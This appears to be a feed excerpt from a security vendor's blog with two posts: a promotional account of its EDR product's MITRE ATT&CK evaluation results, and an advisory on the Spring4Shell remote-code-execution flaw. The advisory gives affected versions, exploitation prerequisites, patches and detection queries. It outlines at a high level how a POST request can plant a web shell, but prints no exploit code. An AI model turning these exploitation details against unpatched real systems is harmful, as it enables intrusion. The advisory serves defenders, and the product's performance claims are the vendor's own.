<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29755" data-permalink="https://blog.qualys.com/product-tech/2022/03/31/qualys-multi-vector-edr-excels-in-2022-mitre-attck-evaluation/attachment/image_1-11-47-46-am" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/image_1-11.47.46-AM.png" data-orig-size="2872,1410" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image_1-11.47.46-AM" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/image_1-11.47.46-AM-300x147.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/image_1-11.47.46-AM-1070x525.png" loading="lazy" width="1070" height="525" src="https://blog.qualys.com/wp-content/uploads/2022/03/image_1-11.47.46-AM-1070x525.png" alt="" class="wp-image-29755" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image_1-11.47.46-AM-1070x525.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image_1-11.47.46-AM-300x147.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image_1-11.47.46-AM-768x377.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image_1-11.47.46-AM-1536x754.png 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image_1-11.47.46-AM-2048x1005.png 2048w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<p>While prevention capabilities were not tested in this round of MITRE ATT&amp;CK evaluation, our EDR solution, when combined with our<a href="https://blog.qualys.com/product-tech/2021/05/03/the-convergence-of-endpoint-protection-with-detection-response"> integrated anti-malware</a>, would have blocked the attack. When set to “blocking mode”, it would have prevented the ransomware from ever running beginning from the moment the malicious payload was placed on disk.&nbsp;</p>



<h3>Noise Cancellation&nbsp;</h3>



<p>The attacker tries to persist in the environment via a registry run key, something which can cause headaches for security teams dealing with continuous infections after responding to events. Multi-Vector EDR provides rich context around this event and brings it to the users&#8217; attention over the noise of the environment, as you can see here.&nbsp;&nbsp;</p>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29757" data-permalink="https://blog.qualys.com/product-tech/2022/03/31/qualys-multi-vector-edr-excels-in-2022-mitre-attck-evaluation/attachment/image_2" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/image_2.png" data-orig-size="2874,1410" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image_2" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/image_2-300x147.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/image_2-1070x525.png" loading="lazy" width="1070" height="525" src="https://blog.qualys.com/wp-content/uploads/2022/03/image_2-1070x525.png" alt="" class="wp-image-29757" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image_2-1070x525.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image_2-300x147.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image_2-768x377.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image_2-1536x754.png 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image_2-2048x1005.png 2048w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<h3>Rich Context&nbsp;</h3>



<p>Another deep level of insight is the high level of context provided to the user as they are investigating events. As you can see as an example in step 10.A.1 not only was the event alerted, but Qualys Multi-Vector EDR also provides the context that this attack looks like the capabilities of the Wizard Spider team. There’s something unique here.&nbsp;&nbsp;</p>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29758" data-permalink="https://blog.qualys.com/product-tech/2022/03/31/qualys-multi-vector-edr-excels-in-2022-mitre-attck-evaluation/attachment/image_3" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/image_3.png" data-orig-size="2872,1412" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image_3" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/image_3-300x147.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/image_3-1070x526.png" loading="lazy" width="1070" height="526" src="https://blog.qualys.com/wp-content/uploads/2022/03/image_3-1070x526.png" alt="" class="wp-image-29758" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image_3-1070x526.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image_3-300x147.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image_3-768x378.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image_3-1536x755.png 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image_3-2048x1007.png 2048w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<p>Competing EDR products do not enrich events with both MITRE ATT&amp;CK Tactics and Techniques like Qualys Multi-Vector EDR does.&nbsp;&nbsp;</p>



<h3>Incident Scoring Model&nbsp;&nbsp;</h3>



<p>Another feature that helps cyber defenders protect their critical systems is our patent-pending incident scoring model. This newly introduced scoring model algorithmically calculates the impact that a particular attack technique will have on the asset. As seen in the example screenshot below:&nbsp;</p>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29764" data-permalink="https://blog.qualys.com/product-tech/2022/03/31/qualys-multi-vector-edr-excels-in-2022-mitre-attck-evaluation/attachment/windows-defender" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/windows-defender.png" data-orig-size="2252,1179" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="windows-defender" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/windows-defender-300x157.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/windows-defender-1070x560.png" loading="lazy" width="1070" height="560" src="https://blog.qualys.com/wp-content/uploads/2022/03/windows-defender-1070x560.png" alt="" class="wp-image-29764" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/windows-defender-1070x560.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/windows-defender-300x157.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/windows-defender-768x402.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/windows-defender-1536x804.png 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/windows-defender-2048x1072.png 2048w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<p>What you see here is a risk score in addition to information about why the technique T1562.001 was flagged and deemed malicious. Defenders can use this to prioritize across multiple techniques and take remediation actions to protect their assets.&nbsp;</p>



<h3>Power of the Qualys Cloud Platform&nbsp;</h3>



<p>Qualys Multi-Vector EDR deploys a single agent on a single platform, combining all Qualys Cloud Apps such as Vulnerability Management, Policy Compliance, File Integrity Monitoring, and Cyber Security Asset Management into a single solution. Because of this, enterprises enjoy tremendous situational awareness when responding to events like what was tested in the MITRE ATT&amp;CK evaluation. With the quick click of a button, users can see the security posture and system information of the asset being investigated, as shown below.&nbsp;&nbsp;</p>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29759" data-permalink="https://blog.qualys.com/product-tech/2022/03/31/qualys-multi-vector-edr-excels-in-2022-mitre-attck-evaluation/attachment/image_4" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/image_4.png" data-orig-size="2866,1418" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image_4" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/image_4-300x148.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/image_4-1070x529.png" loading="lazy" width="1070" height="529" src="https://blog.qualys.com/wp-content/uploads/2022/03/image_4-1070x529.png" alt="" class="wp-image-29759" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image_4-1070x529.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image_4-300x148.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image_4-768x380.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image_4-1536x760.png 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/image_4-2048x1013.png 2048w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<hr class="wp-block-separator is-style-wide"/>



<p class="has-text-align-center"><strong><strong>Webinar: Integrate VMDR with EDR to quickly reduce risk of compromise</strong></strong></p>



<div class="wp-block-button is-style-fill" style="margin: 0 auto 1em; text-align: center;"><a class="wp-block-button__link has-white-color has-text-color has-background" href="https://event.on24.com/wcc/r/3722586/B79E0AD0D2C18830ED08E78C13A37F6E" style="background-color:#ed2e26">Register</a></div>



<hr class="wp-block-separator is-style-wide"/>



<h3>Conclusion&nbsp;</h3>



<p>MITRE Engenuity tested 30 security products during this fourth round of ATT&amp;CK evaluations. Despite going head-to-head with EDR vendor offerings that have been in the market for over a decade, Qualys Multi-Vector EDR met the challenge. Our solution accurately detected MITRE’s simulated adversary across the attack chain. Qualys Multi-Vector EDR enriches events using MITRE ATT&amp;CK Tactics as well as Techniques, a level of contextual analysis unique to current EDR offerings. These results attest to how Qualys Multi-Vector EDR leverages the Qualys Cloud Platform to sift through the noise, surface the data that matters most to the security team, and provide multiple layers of detection throughout any potential attack.&nbsp;</p>



<p>To help security teams protect, detect, and respond to advanced persistent threat groups like Sandworm and Wizard Spider, Qualys is offering<a href="https://www.qualys.com/forms/endpoint-detection-response/"> Multi-Vector EDR free for 30 days</a>.&nbsp;&nbsp;</p>
]]></content:encoded>
      <wfw:commentRss>https://blog.qualys.com/product-tech/2022/03/31/qualys-multi-vector-edr-excels-in-2022-mitre-attck-evaluation/feed</wfw:commentRss>
      <slash:comments>0</slash:comments>
      <authorTitle><![CDATA[Director, Malware Threat Research, Qualys]]></authorTitle>
      <authorAvatar><![CDATA[https://secure.gravatar.com/avatar/4a2306cf44c36e08e6e858df73191dd6?s=192&d=mm&r=g]]></authorAvatar>
      <authorPosts><![CDATA[https://blog.qualys.com/author/tsmith]]></authorPosts>
      <postCategory>
        <name><![CDATA[Product and Tech]]></name>
        <link><![CDATA[https://blog.qualys.com/category/product-tech]]></link>
      </postCategory>
      <customExcerpt><![CDATA[
<p><em>MITRE evaluated Qualys Multi-Vector EDR against competing alternatives, and the results are in. This blog reviews the basics of MITRE ATT&amp;CK evaluation, how our EDR solution performed, and how to interpret the ratings.</em>&nbsp;</p>



<p><a href="https://attackevals.mitre-engenuity.org/">MITRE Engenuity</a> has released the <a href="https://attackevals.mitre-engenuity.org/enterprise/participants/qualys?view=overview&amp;adversary=wizard-spider-sandworm">results</a><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-vivid-red-color"> </mark>of<a href="https://attackevals.mitre-engenuity.org/enterprise/wizard-spider-and-sandworm/"> round 4 of its ATT&amp;CK Evaluations</a> based on the Wizard Spider and Sandworm APT Groups. With the release of<a href="https://www.qualys.com/apps/endpoint-detection-response/"> Qualys Multi-Vector EDR</a> in late 2020, we were able to fully participate in this year’s evaluation. MITRE’s latest ratings clearly show that Qualys can detect, analyze, and alert attacks throughout the entire chain of attack.&nbsp;</p>



<p>Bottom line: Qualys Multi-Vector EDR successfully detected MITRE’s simulated adversary all throughout the attack chain.</p>



<p><strong>Overall, our solution detected 100% of the tested steps and&nbsp;returned 74% visibility into the entire attack chain. </strong>This is independent third-party verification that Qualys Multi-Vector EDR doesn’t overburden security teams with mountains of data to churn through, while accurately detecting attacks.&nbsp;</p>



<p>What’s more, our EDR solution enriches events using MITRE ATT&amp;CK Tactics in addition to MITRE ATT&amp;CK Techniques, something other EDR products simply do not do.&nbsp;</p>



]]></customExcerpt>
    </item>
    <item>
      <title>Spring Framework Zero-Day Remote Code Execution (Spring4Shell) Vulnerability </title>
      <link>https://blog.qualys.com/vulnerabilities-threat-research/2022/03/31/spring-framework-zero-day-remote-code-execution-spring4shell-vulnerability</link>
      <comments>https://blog.qualys.com/vulnerabilities-threat-research/2022/03/31/spring-framework-zero-day-remote-code-execution-spring4shell-vulnerability#comments</comments>
      <dc:creator><![CDATA[Bharat Jogi]]></dc:creator>
      <pubDate>Thu, 31 Mar 2022 09:00:00 +0000</pubDate>
      <category><![CDATA[Vulnerabilities and Threat Research]]></category>
      <category><![CDATA[Spring4Shell]]></category>
      <guid isPermaLink="false">https://blog.qualys.com/?p=29748</guid>
      <description><![CDATA[This page last updated: April 7th A new zero-day Remote Code Execution (RCE) vulnerability, “Spring4Shell” or “SpringShell” was disclosed in the Spring framework. An unauthorized attacker can exploit this vulnerability to remotely execute arbitrary code on the target device.&#160; What is Spring Framework?&#160; Spring-core is a prevalent framework widely used in Java applications that allows [&#8230;]]]></description>
      <content:encoded><![CDATA[
<p><em>This page last updated: April 7<sup>th</sup></em></p>



<p>A new zero-day Remote Code Execution (RCE) vulnerability, “Spring4Shell” or “SpringShell” was disclosed in the Spring framework. An unauthorized attacker can exploit this vulnerability to remotely execute arbitrary code on the target device.&nbsp;</p>



<h3>What is Spring Framework?&nbsp;</h3>



<p>Spring-core is a prevalent framework widely used in Java applications that allows software developers to develop Java applications with enterprise-level components effortlessly.&nbsp;</p>



<h3>Which versions are vulnerable?&nbsp;</h3>



<p>The vulnerability requires JDK version 9 or later to be running. Spring Framework versions 5.3.0 to 5.3.17, 5.2.0 to 5.2.19, and older versions are vulnerable. It allows remote attackers to plant a web shell when running Spring framework apps on top of JRE 9. It is caused by unsafe deserialization of given arguments that a simple HTTP POST request can trigger to allow full remote access.&nbsp;</p>



<h3>How can this be exploited?&nbsp;</h3>



<p>The exploitation of this vulnerability relies on an endpoint with DataBinder enabled, which decodes data from the request body automatically. This property could enable an attacker to leverage Spring4Shell against a vulnerable application. In fact, the Spring framework class DataBinder warns about this in its <a rel="noreferrer noopener" href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/validation/DataBinder.html" target="_blank">documentation</a>:&nbsp;</p>



<p>“Note that there are potential security implications in failing to set an array of allowed fields. In the case of HTTP form POST data, for example, malicious clients can attempt to subvert an application by supplying values for fields or properties that do not exist on the form. In some cases, this could lead to illegal data being set on command objects or their nested objects. For this reason, it is highly recommended to specify the allowedFields property on the DataBinder.”&nbsp;</p>



<span id="more-29748"></span>



<h3>What are the prerequisites to exploit this vulnerability?&nbsp;</h3>



<ul><li>JDK 9 or higher&nbsp;</li><li>Apache Tomcat as the Servlet container&nbsp;</li><li>Packaged as a traditional WAR (in contrast to a Spring Boot executable jar)&nbsp;</li><li>spring-webmvc or spring-webflux dependency&nbsp;</li><li>Spring Framework versions 5.3.0 to 5.3.17, 5.2.0 to 5.2.19, and older versions&nbsp;</li></ul>



<h3>Is there a patch available for Spring4Shell?&nbsp;</h3>



<p>Spring Framework 5.3.18 and 5.2.20, that contain the fixes, have been released. If you’re able to upgrade to Spring Framework <strong>5.3.18</strong> and <strong>5.2.20</strong>, no workarounds are necessary.&nbsp;</p>



<p>In case you cannot update to the latest Spring Framework version upgrading to Apache Tomcat  <strong>10.0.20</strong>, <strong>9.0.62</strong>, or  <strong>8.5.78</strong> provides adequate protection but not solves the vulnerability completely.&nbsp;&nbsp;</p>



<p>In addition, there are multiple working proof-of-concept (PoC) exploits available for Spring4Shell. We strongly recommend that organizations deploy these mitigations or use a third-party firewall for defense.&nbsp;</p>



<h3>Qualys Coverage&nbsp;</h3>



<p>Qualys Research Team has released the following authenticated QIDs to address this vulnerability for now. These QIDs will be available starting with vulnsigs version VULNSIGS-2.5.438-3 and in Cloud Agent manifest version LX_MANIFEST-2.5.438.3-2.&nbsp;</p>



<figure class="wp-block-table is-style-stripes"><table><thead><tr><th><strong>QID</strong></th><th><strong>Title</strong></th><th><strong>Version</strong></th><th><strong>Available&nbsp;for</strong></th></tr></thead><tbody><tr><td>376506</td><td>Spring Core Remote Code Execution (RCE) Vulnerability (Spring4Shell)</td><td>VULNSIGS-2.5.438-3</td><td>Scanner/Cloud Agent</td></tr><tr><td>45525</td><td>Spring core or Spring beans jar detected</td><td>VULNSIGS-2.5.438-3</td><td>Scanner/Cloud Agent</td></tr><tr><td>150494</td><td>Spring Cloud Function Remote Code Execution (RCE) Vulnerability (CVE-2022-22963)</td><td>VULNSIGS-2.5.440-3</td><td>Web Application Security</td></tr><tr><td>376508</td><td>Spring Cloud Function Remote Code Execution (RCE) Vulnerability (Authenticated)</td><td>VULNSIGS-2.5.440-6/&nbsp;lx_manifest-2.5.440.6-5</td><td>Scanner/Cloud Agent</td></tr><tr><td>730418</td><td>Spring Cloud Function Remote Code Execution (RCE) Vulnerability (Unauthenticated Check)</td><td>VULNSIGS-2.5.440-6</td><td>Scanner</td></tr><tr><td>150495&nbsp;</td><td>Spring Core Remote Code Execution (RCE) Vulnerability CVE-2022-22965 (Spring4Shell)&nbsp;</td><td>VULNSIGS-2.5.443-3&nbsp;</td><td>Web Application Security&nbsp;</td></tr><tr><td>48209&nbsp;</td><td>Spring Framework and Spring Boot JARs Spring Cloud JARs Detected Scan Utility&nbsp;</td><td>VULNSIGS-2.5.444-2/manifest 2.5.444.2-1&nbsp;</td><td>Scanner/Cloud Agent&nbsp;</td></tr><tr><td>376514&nbsp;</td><td>Spring Framework Remote Code Execution (RCE) Vulnerability (Spring4Shell) Scan Utility&nbsp;</td><td>VULNSIGS-2.5.444-2/manifest 2.5.444.2-1&nbsp;</td><td>Scanner/Cloud Agent&nbsp;</td></tr><tr><td>376520&nbsp;</td><td>Spring Cloud Function Remote Code Execution (RCE) Vulnerability Scan Utility&nbsp;</td><td>VULNSIGS-2.5.444-2/manifest 2.5.444.2-1&nbsp;</td><td>Scanner/Cloud Agent&nbsp;</td></tr><tr><td>730416&nbsp;</td><td>Spring Core Remote Code Execution (RCE) Vulnerability (Spring4Shell) (Unauthenticated Check)&nbsp;</td><td>VULNSIGS-2.5.445-3&nbsp;</td><td>Scanner&nbsp;</td></tr></tbody></table></figure>



<h3>Discover Your Attack Surface with up-to-date CyberSecurity Asset Management&nbsp;</h3>



<p>As a first step, Qualys recommends assessing all assets in your environment to map the entire attack surface of your organization. &nbsp;</p>



<h4>Scoping Potential Attack Surface&nbsp;</h4>



<p>Qualys Cybersecurity Asset Management (CSAM) continuously inventories all your assets and software. Use CSAM to find assets with Apache Tomcat running on JDK 9 or higher.&nbsp;</p>



<pre class="wp-block-code"><code>QQL: <em>software:(name:tomcat) and software:(name:"jdk" and version&gt;=9)</em><em></em>&nbsp;</code></pre>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29810" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/31/spring-framework-zero-day-remote-code-execution-spring4shell-vulnerability/attachment/csam-sshot-1" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/CSAM-sshot-1.png" data-orig-size="2086,1280" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="CSAM-sshot-1" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/CSAM-sshot-1-300x184.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/CSAM-sshot-1-1070x657.png" loading="lazy" width="1070" height="657" src="https://blog.qualys.com/wp-content/uploads/2022/04/CSAM-sshot-1-1070x657.png" alt="" class="wp-image-29810" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CSAM-sshot-1-1070x657.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CSAM-sshot-1-300x184.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CSAM-sshot-1-768x471.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CSAM-sshot-1-1536x943.png 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CSAM-sshot-1-2048x1257.png 2048w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<h4>Finding Vulnerable Spring Components and Versions&nbsp;</h4>



<p>Qualys CSAM can further help you narrow down the scope by adding Spring Framework to the search criteria, and specifically match on vulnerable components and versions. &nbsp;This can be used to find assets that have not yet been scanned with VMDR for the Spring4Shell QIDs yet.&nbsp;</p>



<pre class="wp-block-code"><code>QQL: software:(name:tomcat) and software:(name:"jdk" and version&gt;=9) and software:(name:"Spring" and version:"vulnerable")&nbsp;</code></pre>



<h4>Monitoring Upgrades and Mitigations&nbsp;</h4>



<p>Upgrading to Spring Framework 5.3.18+ or 5.2.20+ addresses the root cause and prevents other attack vectors, and it adds protection for other CVEs. Qualys CSAM allows customers to list all Spring Framework versions and verify upgrades.&nbsp;</p>



<p>However, some may be in a position where upgrading is not possible to do quickly. &nbsp;VMware provided the mitigation alternative to upgrade Apache Tomcat to versions 10.0.20, 9.0.62, or 8.5.78, which close the attack vector on Tomcat’s side. &nbsp;Qualys CSAM allows you to check for the presence or absence of these Tomcat updates.&nbsp;</p>



<p>QQL for assets with mitigated Tomcat:&nbsp;</p>



<pre class="wp-block-code"><code>software:(name:tomcat and update:&#91;`10.0.20`,`9.0.62`,`8.5.78`])&nbsp;</code></pre>



<p>QQL for assets excluding mitigated Tomcat:&nbsp;</p>



<pre class="wp-block-code"><code>software:(name:tomcat and not update:&#91;`10.0.20`,`9.0.62`,`8.5.78`]) and software:(name:"jdk" and version&gt;=9) and software:(name:"Spring" and version:"vulnerable")&nbsp;</code></pre>



<h4>Context Is Critical to Prioritize and Remediate&nbsp;</h4>



<p>Security teams need to understand the distribution of affected assets from different perspectives, such as internet-exposed, production versus non-production, and which of these assets support business-critical services. Qualys CSAM integrates with additional sources, to import asset and business context, that helps customers further understand their impact, prioritize assets based on business criticality, and work with corresponding asset owners and support groups to take remedial actions.&nbsp;</p>



<p>QQL for assets with Tomcat exposed to the internet and visible in Shodan:&nbsp;</p>



<pre class="wp-block-code"><code>software:(name:tomcat) and software:(name:"jdk" and version&gt;=9) and tags.name:shodan&nbsp;</code></pre>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29811" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/31/spring-framework-zero-day-remote-code-execution-spring4shell-vulnerability/attachment/csam-sshot-2" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/CSAM-sshot-2.png" data-orig-size="2086,907" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="CSAM-sshot-2" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/CSAM-sshot-2-300x130.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/CSAM-sshot-2-1070x465.png" loading="lazy" width="1070" height="465" src="https://blog.qualys.com/wp-content/uploads/2022/04/CSAM-sshot-2-1070x465.png" alt="" class="wp-image-29811" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CSAM-sshot-2-1070x465.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CSAM-sshot-2-300x130.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CSAM-sshot-2-768x334.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CSAM-sshot-2-1536x668.png 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/CSAM-sshot-2-2048x890.png 2048w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<h3>Detect the Vulnerability with Qualys WAS</h3>



<p>Second, protect your public Internet-facing apps, as they are the most exposed to attack and therefore high priority. &nbsp;</p>



<p>The Qualys WAS Research Team has developed two signatures for detecting vulnerable versions of the Spring Framework.&nbsp;&nbsp;</p>



<ul><li>QID 150494 (released April 1<sup>st</sup>) will report vulnerable versions of Spring Cloud Applications (CVE-2022-22963).&nbsp;</li><li>QID 150495 (released on 6<sup>th</sup>) will report vulnerable versions of Spring Core Applications (CVE-2022-22965).&nbsp;&nbsp;</li></ul>



<p>These QIDs are automatically added to the Core Detection Scope.&nbsp; If you are scanning web applications with the Initial WAS Option Profile then there is no further action necessary.&nbsp; Your scans will automatically test for vulnerable versions of the Spring Framework and report any vulnerable instances found.&nbsp;</p>



<p>If you are using a custom Option Profile for your scans, please ensure you are either using the Core Detection Scope in your Option Profile or adding the above QIDs to any static or dynamic Custom Search Lists.&nbsp;</p>



<figure class="wp-block-image size-full"><img data-attachment-id="29792" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/31/spring-framework-zero-day-remote-code-execution-spring4shell-vulnerability/attachment/was-1" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/WAS-1.png" data-orig-size="885,275" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="WAS-1" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/WAS-1-300x93.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/WAS-1.png" loading="lazy" width="885" 